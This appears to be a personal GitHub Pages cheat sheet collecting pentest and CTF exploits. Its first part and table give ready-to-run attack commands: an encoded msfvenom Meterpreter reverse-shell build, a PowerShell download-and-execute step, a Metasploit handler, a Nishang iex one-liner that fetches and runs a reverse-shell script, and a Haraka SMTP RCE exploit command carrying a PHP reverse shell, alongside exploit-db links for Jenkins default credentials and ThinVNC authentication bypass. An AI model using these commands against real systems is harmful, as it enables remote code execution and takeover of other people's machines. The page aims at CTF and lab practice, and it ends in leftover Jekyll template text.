## Pentest make easy

The purspose of this site is to make the Penetration testing and Privilege escation make easy. There are several exploits and various writeup avilable. But when it is needed its very difficult to find out the exact exploit and the writeup.

In this site I am attempting to collect most of the common exploits that appear in CTF and other exinvornments.

### Getting Revese shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

Once this is running, enter this command to start the reverse shell

```bash
Start-Process "shell-name.exe"
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

```
### [Reverse Shell Collection](https://github.com/dayaramb/dayaramb.github.io/tree/master/reverse_shells)


### Random Exploit collection

Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.

|s.no| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
| --- | --- | --- | --- | --- | --- | --- |
|1.| Jenkins  | default username and pass |Running in Windows | [Nishang](https://github.com/samratashok/nishang) to gain initial access.| Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:```powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port``` You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server|[jenkis writeup](https://executeatwill.com/2020/04/01/TryHackMe-Alfred-Walkthrough/) |
| 2.|ThinVNC  1.0b1  | Authentication Bypass CVE-2019-17662 | VNC running in port 3389 and can be exploited using password lookup, can be accessed using Browser|[Exploit 47519](https://www.exploit-db.com/exploits/47519). Simply using Burp suite also reveals the password here as well.  |to get reverse shell first get the password of admin user and then login. After you can use nc.exe to connect to the Kali. |[Video](https://www.youtube.com/watch?v=uNll_EYri0A)|
|3.|Haraka SMTP < 2.8.9 |Remote Command Execution |runing in different port than 25 in Linux |[Exploit 41162](https://www.exploit-db.com/exploits/41162) only need to change the port |```python 41162.py -c "php -r '\$sock=fsockopen(\"192.168.100.1\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t root@haraka.test -m 192.168.200.1``` or bash method.  |[Similar HTB writeup](https://0xdf.gitlab.io/2019/04/13/htb-redcross.html)

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/dayaramb/dayaramb.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
